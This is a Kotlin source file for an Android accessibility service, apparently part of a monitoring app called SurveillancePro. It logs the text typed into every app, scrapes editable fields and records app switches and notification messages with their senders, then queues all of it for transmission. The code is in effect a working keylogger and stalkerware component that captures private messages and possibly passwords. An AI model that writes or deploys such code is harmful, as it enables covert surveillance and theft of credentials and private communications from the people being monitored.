package com.surveillancepro.android.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SupervisionAccessibilityService : AccessibilityService() {

    private var lastKeystrokeText = ""
    private var lastKeystrokePackage = ""
    private var lastKeystrokeTime = 0L

    private var lastFocusPackage = ""
    private var lastNotifText = ""

    // Buffer pour accumuler les frappes avant envoi
    private var keystrokeBuffer = ""
    private var keystrokeBufferPackage = ""
    private var keystrokeBufferStart = 0L
    private val BUFFER_FLUSH_DELAY = 3000L // envoie après 3s d'inactivité

    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
    private val flushRunnable = Runnable { flushKeystrokeBuffer() }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> handleFocusChanged(event)
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> handleNotification(event)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleContentChanged(event)
            AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED -> {} // ignoré volontairement
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val packageName = event.packageName?.toString() ?: "unknown"
        val now = System.currentTimeMillis()

        // Si on change d'app, on flush le buffer précédent
        if (packageName != keystrokeBufferPackage && keystrokeBuffer.isNotEmpty()) {
            flushKeystrokeBuffer()
        }

        // Éviter les doublons stricts seulement (même texte exact, même app, < 500ms)
        if (text == lastKeystrokeText && packageName == lastKeystrokePackage && now - lastKeystrokeTime < 500) return

        lastKeystrokeText = text
        lastKeystrokePackage = packageName
        lastKeystrokeTime = now

        // Accumuler dans le buffer
        keystrokeBuffer = text
        keystrokeBufferPackage = packageName
        if (keystrokeBufferStart == 0L) keystrokeBufferStart = now

        // Programmer un flush après le délai d'inactivité
        handler.removeCallbacks(flushRunnable)
        handler.postDelayed(flushRunnable, BUFFER_FLUSH_DELAY)

        // Flush immédiat si le buffer est très long (message complet probable)
        if (text.length > 200) {
            handler.removeCallbacks(flushRunnable)
            flushKeystrokeBuffer()
        }
    }

    private fun flushKeystrokeBuffer() {
        if (keystrokeBuffer.isBlank()) return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("keystroke", mapOf(
            "text" to keystrokeBuffer.take(2000),
            "app" to keystrokeBufferPackage,
            "timestamp" to timestamp,
        ))

        keystrokeBuffer = ""
        keystrokeBufferPackage = ""
        keystrokeBufferStart = 0L
    }

    private fun handleContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val source = event.source ?: return

        try {
            val editTexts = mutableListOf<AccessibilityNodeInfo>()
            findEditTexts(source, editTexts, depth = 0)

            for (node in editTexts) {
                val text = node.text?.toString() ?: continue
                if (text.isBlank()) continue

                val now = System.currentTimeMillis()
                if (text == lastKeystrokeText && packageName == lastKeystrokePackage && now - lastKeystrokeTime < 500) continue

                lastKeystrokeText = text
                lastKeystrokePackage = packageName
                lastKeystrokeTime = now

                if (packageName != keystrokeBufferPackage && keystrokeBuffer.isNotEmpty()) {
                    flushKeystrokeBuffer()
                }

                keystrokeBuffer = text
                keystrokeBufferPackage = packageName
                if (keystrokeBufferStart == 0L) keystrokeBufferStart = now

                handler.removeCallbacks(flushRunnable)
                handler.postDelayed(flushRunnable, BUFFER_FLUSH_DELAY)
            }
        } catch (_: Exception) {
        } finally {
            try { source.recycle() } catch (_: Exception) {}
        }
    }

    private fun findEditTexts(node: AccessibilityNodeInfo, results: MutableList<AccessibilityNodeInfo>, depth: Int) {
        if (depth > 15) return
        if (node.className?.toString()?.contains("EditText") == true || node.isEditable) {
            results.add(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findEditTexts(child, results, depth + 1)
        }
    }

    private fun handleFocusChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (packageName == lastFocusPackage) return

        // Flush keystroke buffer quand on change d'app
        if (keystrokeBuffer.isNotEmpty()) {
            flushKeystrokeBuffer()
        }

        lastFocusPackage = packageName

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("app_focus", mapOf(
            "app" to packageName,
            "timestamp" to timestamp,
        ))
    }

    private fun handleNotification(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val text = event.text?.joinToString(" ") ?: return
        if (text.isBlank() || text == lastNotifText) return
        lastNotifText = text

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("notification_message", mapOf(
            "app" to packageName,
            "message" to text.take(500),
            "sender" to (event.contentDescription?.toString() ?: ""),
            "source" to "accessibility",
            "timestamp" to timestamp,
        ))
    }

    override fun onInterrupt() {
        flushKeystrokeBuffer()
    }

    override fun onDestroy() {
        flushKeystrokeBuffer()
        handler.removeCallbacks(flushRunnable)
        super.onDestroy()
    }
}
